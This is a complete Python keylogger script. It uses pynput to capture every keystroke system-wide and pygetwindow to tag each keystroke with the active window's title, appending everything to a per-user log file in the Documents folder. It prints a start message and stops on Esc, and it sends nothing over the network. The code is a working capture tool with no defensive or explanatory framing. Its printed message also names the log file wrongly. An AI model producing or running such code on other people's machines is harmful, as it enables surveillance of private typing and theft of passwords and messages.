import os
from datetime import datetime
from pynput import keyboard
import pygetwindow as gw

# new user-differentiation logic
username = os.getlogin()
LOG_FILE = os.path.join(
    os.path.expanduser("~"), "Documents", f"{username}_activity_log.txt"
)

# Track the last active window to avoid printing the title on every single letter
last_window = None

def get_active_window_title():
    """Retrieves the title of the currently focused window."""
    try:
        window = gw.getActiveWindow()
        if window and window.title:
            return window.title
    except Exception:
        pass
    return "Unknown Application"

def on_press(key):
    global last_window

    # check the current active window 
    current_window = get_active_window_title()
    window_header = ""

    # if the user switched windows, create a header in the log
    if current_window != last_window:
     window_header = f"\n\n--- [Active Window: {current_window}] ---\n"
     last_window = current_window

    # parse the keystroke
    try:
       log_entry = key.char
    except AttributeError:
       if key == keyboard.Key.space:
          log_entry = " "   
       elif key ==  keyboard.Key.enter:
          log_entry = "\n"
       elif key == keyboard.Key.tab:
          log_entry = "\t"
       else:
          log_entry = f"  [{key.name}] "
    # append the header (if changed) and the keystroke to the file
    with open(LOG_FILE, "a", encoding="utf-8") as file:
       if window_header:
          file.write(window_header)
       file.write(log_entry)

def on_release(key):
   # press escape to stop the script
   if key == keyboard.Key.esc:
      return False

# start monitoring
print("Monitoring started. Press 'Esc' to  exit and view 'activity_log.txt'.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
   listener.join()


